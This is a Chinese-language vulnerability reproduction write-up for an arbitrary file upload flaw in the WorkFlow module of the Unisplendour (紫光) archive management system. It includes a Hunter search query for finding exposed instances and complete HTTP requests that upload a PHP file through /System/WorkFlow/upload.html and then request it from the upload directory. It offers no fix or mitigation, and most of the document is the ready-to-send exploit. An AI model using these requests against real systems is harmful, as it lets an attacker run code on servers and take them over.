# 紫光档案管理系统WorkFlow存在任意文件上传漏洞

# 一、漏洞简介
紫光电子档案管理系统是一款专业的电子档案管理软件，旨在帮助企业实现高效、便捷的档案管理。系统具有强大的文件存储、检索和共享功能，能够提供全面的档案管理解决方案。同时，紫光电子档案管理系统还拥有智能化的分类和归档功能，可以自动识别文件类型和属性，实现快速分类和高效管理。用户只需简单操作，就能轻松实现对各类电子档案的整理、查询和备份，极大提升了工作效率和信息安全性。紫光档案管理系统WorkFlow存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 紫光档案管理系统

# 三、资产测绘
+ hunter`app.name="紫光档案管理系统"`
+ 特征

![1706701328959-e1863eab-b7f1-4486-80c8-0a22052ee093.png](./img/XBNrpIgiaD34ynSQ/1706701328959-e1863eab-b7f1-4486-80c8-0a22052ee093-481346.png)

# 四、漏洞复现
```plain
POST /System/WorkFlow/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Connection: close
Content-Length: 566
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=vow8ojiofbpypwih3t3i

--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="userID"

admin
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="fondsid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="comid"

1
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="token"

affe447f075bac53a7e568e833391e67
--vow8ojiofbpypwih3t3i
Content-Disposition: form-data; name="Filedata"; filename="wizjbifuta.php"
Content-Type: multipart/form-data


<?php echo "2ccASC47CJ474cqTBuzA0q6FCAS";unlink(__FILE__); ?>
--vow8ojiofbpypwih3t3i--
```

![1708400624091-0445193c-2775-46e8-941b-14504eb04eca.png](./img/XBNrpIgiaD34ynSQ/1708400624091-0445193c-2775-46e8-941b-14504eb04eca-391445.png)

上传文件位置

```plain
GET /tmp/System/WorkFlow/import/20240220/65d41fbc77b27.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: close
Accept: text/*
Cookie: PHPSESSID=d3dbba517d0d6ff544f1be11e134a7f9
Accept-Encoding: gzip, deflate
```

![1708400691415-3428fb4b-98d4-43ce-ae07-f9b7a0edae2e.png](./img/XBNrpIgiaD34ynSQ/1708400691415-3428fb4b-98d4-43ce-ae07-f9b7a0edae2e-480631.png)



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qgnm98f455xygfw3>